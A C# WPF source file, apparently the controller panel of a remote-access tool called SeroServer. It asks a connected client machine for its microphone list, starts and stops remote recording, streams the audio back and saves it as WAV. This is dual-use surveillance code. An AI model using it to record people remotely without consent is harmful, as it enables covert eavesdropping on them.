using System.Collections.Generic;
using System.IO;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
// using System.Windows.Shapes — Rectangle referenced with full name below
using System.Windows.Threading;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class MicrophoneWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;

    private bool _recording;
    private readonly List<byte[]> _chunks = [];
    private const int SampleRate = 16000;
    private const int Channels   = 1;
    private const int BitsPerSample = 16;

    private readonly DispatcherTimer _recTimer  = new() { Interval = TimeSpan.FromSeconds(1) };
    private readonly DispatcherTimer _waveTimer = new() { Interval = TimeSpan.FromMilliseconds(50) };
    private int     _recSeconds;
    private float[] _waveform = new float[100];
    private int     _wavePos;

    public MicrophoneWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.MicDevicesResult, OnDevices);
        _server.RegisterHandler(clientId, PacketType.MicData,          OnAudioChunk);

        _recTimer.Tick  += (_, _) => { _recSeconds++; TxtRecTime.Text = $"{_recSeconds / 60}:{_recSeconds % 60:D2}"; };
        _waveTimer.Tick += (_, _) => DrawWaveform();

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.MicDevicesResult);
            _server.UnregisterHandler(clientId, PacketType.MicData);
            if (_recording) SendStop();
        };
        Loaded += async (_, _) =>
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.MicGetDevices });
    }

    private void OnDevices(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<MicDevicesResultData>(pkt.Data);
        if (data == null) return;
        Dispatcher.Invoke(() =>
        {
            CmbDevice.Items.Clear();
            foreach (var d in data.Devices)
                CmbDevice.Items.Add(new MicDeviceItem(d.Index, d.Name));
            if (CmbDevice.Items.Count > 0) CmbDevice.SelectedIndex = 0;
            TxtStatus.Text = $"{data.Devices.Count} device(s) found";
        });
    }

    private void OnAudioChunk(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<MicDataPacket>(pkt.Data);
        if (data == null || string.IsNullOrEmpty(data.Data)) return;
        var pcm = Convert.FromBase64String(data.Data);
        lock (_chunks) _chunks.Add(pcm);

        // Update waveform data
        var shorts = new short[pcm.Length / 2];
        Buffer.BlockCopy(pcm, 0, shorts, 0, pcm.Length);
        float peak = 0;
        foreach (var s in shorts)
            peak = Math.Max(peak, Math.Abs(s / 32768f));
        lock (_waveform) _waveform[_wavePos % _waveform.Length] = peak;
        _wavePos++;

        Dispatcher.Invoke(() => TxtStatus.Text = $"Recording… {_chunks.Count} chunks received");
    }

    private async void Record_Click(object s, RoutedEventArgs e)
    {
        if (_recording) return;
        if (CmbDevice.SelectedItem is not MicDeviceItem dev) { TxtStatus.Text = "No device selected."; return; }

        _recording = true;
        _chunks.Clear();
        _recSeconds = 0;
        _wavePos = 0;
        Array.Clear(_waveform);

        PnlIdle.Visibility = Visibility.Collapsed;
        RecordingIndicator.Visibility = Visibility.Visible;
        BtnRecord.IsEnabled = false;
        BtnStop.IsEnabled   = true;
        _recTimer.Start();
        _waveTimer.Start();

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.MicStart,
            Data = JsonConvert.SerializeObject(new MicStartData { DeviceIndex = dev.Index, SampleRate = SampleRate })
        });
    }

    private async void Stop_Click(object s, RoutedEventArgs e)
    {
        if (!_recording) return;
        _recording = false;
        _recTimer.Stop();
        _waveTimer.Stop();
        SendStop();
        RecordingIndicator.Visibility = Visibility.Collapsed;
        BtnRecord.IsEnabled = true;
        BtnStop.IsEnabled   = false;
        int total = 0; lock (_chunks) total = _chunks.Sum(c => c.Length);
        TxtStatus.Text = $"Stopped — {total / (SampleRate * Channels * 2.0):F1}s recorded  ({_chunks.Count} chunks)";
        await Task.CompletedTask;
    }

    private async void SendStop()
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.MicStop });
    }

    private void SaveWav_Click(object s, RoutedEventArgs e)
    {
        List<byte[]> data;
        lock (_chunks) data = [.. _chunks];
        if (data.Count == 0) { MessageBox.Show("Nothing recorded yet.", "Sero"); return; }

        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "WAV Audio (*.wav)|*.wav",
            FileName = $"mic_{DateTime.Now:yyyyMMdd_HHmmss}.wav"
        };
        if (dlg.ShowDialog() != true) return;

        using var fs = File.OpenWrite(dlg.FileName);
        using var bw = new BinaryWriter(fs);
        int dataSize = data.Sum(d => d.Length);
        int byteRate = SampleRate * Channels * (BitsPerSample / 8);
        // WAV header
        bw.Write(System.Text.Encoding.ASCII.GetBytes("RIFF"));
        bw.Write(36 + dataSize);
        bw.Write(System.Text.Encoding.ASCII.GetBytes("WAVE"));
        bw.Write(System.Text.Encoding.ASCII.GetBytes("fmt "));
        bw.Write(16);               // subchunk1 size
        bw.Write((short)1);         // PCM
        bw.Write((short)Channels);
        bw.Write(SampleRate);
        bw.Write(byteRate);
        bw.Write((short)(Channels * BitsPerSample / 8));
        bw.Write((short)BitsPerSample);
        bw.Write(System.Text.Encoding.ASCII.GetBytes("data"));
        bw.Write(dataSize);
        foreach (var chunk in data) bw.Write(chunk);

        TxtStatus.Text = $"Saved: {dlg.FileName}";
        MessageBox.Show($"WAV saved:\n{dlg.FileName}\n\nDuration: {dataSize / (double)byteRate:F1}s",
            "Sero — Microphone", MessageBoxButton.OK, MessageBoxImage.Information);
    }

    private void DrawWaveform()
    {
        WaveCanvas.Children.Clear();
        double w = WaveCanvas.ActualWidth, h = WaveCanvas.ActualHeight;
        if (w < 2 || h < 2) return;

        int bars = (int)(w / 6);
        double barW = w / bars;
        var accent = new SolidColorBrush(Color.FromArgb(0xCC, 0xEF, 0x44, 0x44));

        float[] snap; lock (_waveform) snap = [.. _waveform];

        for (int i = 0; i < bars; i++)
        {
            int dataIdx = (_wavePos - bars + i + snap.Length) % snap.Length;
            float amp = snap[dataIdx];
            double barH = Math.Max(3, amp * h * 0.9);
            var rect = new System.Windows.Shapes.Rectangle
            {
                Width = Math.Max(1, barW - 2),
                Height = barH,
                Fill = accent,
                RadiusX = 1, RadiusY = 1
            };
            System.Windows.Controls.Canvas.SetLeft(rect, i * barW);
            System.Windows.Controls.Canvas.SetTop(rect, (h - barH) / 2);
            WaveCanvas.Children.Add(rect);
        }
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed) DragMove();
    }
    private void Close_Click(object s, RoutedEventArgs e) => Close();
}

public record MicDeviceItem(int Index, string Name)
{
    public override string ToString() => Name;
}
